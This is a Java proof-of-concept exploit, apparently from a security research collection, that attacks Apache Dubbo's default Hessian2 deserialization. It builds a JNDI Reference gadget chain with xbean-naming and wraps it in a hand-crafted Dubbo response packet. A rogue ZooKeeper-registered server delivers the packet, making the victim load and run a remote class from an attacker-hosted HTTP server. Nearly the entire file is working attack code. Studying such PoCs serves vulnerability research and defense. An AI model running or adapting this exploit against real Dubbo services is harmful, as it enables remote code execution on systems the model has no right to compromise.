package com.threedr3am.bug.dubbo.rouge.hessian2;

import com.threedr3am.bug.common.server.HTTPServer;
import com.threedr3am.bug.common.utils.Reflections;
import com.threedr3am.bug.dubbo.rouge.RougeBase;
import com.threedr3am.bug.dubbo.utils.ToStringUtil;
import java.io.ByteArrayOutputStream;
import java.util.Random;
import javax.naming.Context;
import javax.naming.Reference;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * <dependency>
 *   <groupId>org.apache.xbean</groupId>
 *   <artifactId>xbean-naming</artifactId>
 *   <version>4.15</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class XBeanPoc extends RougeBase {

  static {
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws Exception {
    Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
    Reference ref = new Reference("Calc", "Calc","http://127.0.0.1:8080/");
    ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);

    Object s = ToStringUtil.makeToStringTrigger(binding);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    // header.
    byte[] header = new byte[16];
    // set magic number.
    Bytes.short2bytes((short) 0xdabb, header);
    // set response event and serialization flag.
    header[2] = (byte) ((byte) 0x20 | 2);

    // set response id.
    Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

    ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
    Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

    out.writeObject(s);

    out.flushBuffer();
    if (out instanceof Cleanable) {
      ((Cleanable) out).cleanup();
    }

    Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
    byteArrayOutputStream.write(header);
    byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

    byte[] bytes = byteArrayOutputStream.toByteArray();

    String zookeeperUri = "127.0.0.1:2181";
    String rougeHost = "127.0.0.1";
    int rougePort = 33334;

    new XBeanPoc().startRougeServer(zookeeperUri, rougeHost, rougePort, bytes, true);
  }

  @Override
  public String getType() {
    return "hessian2";
  }

}
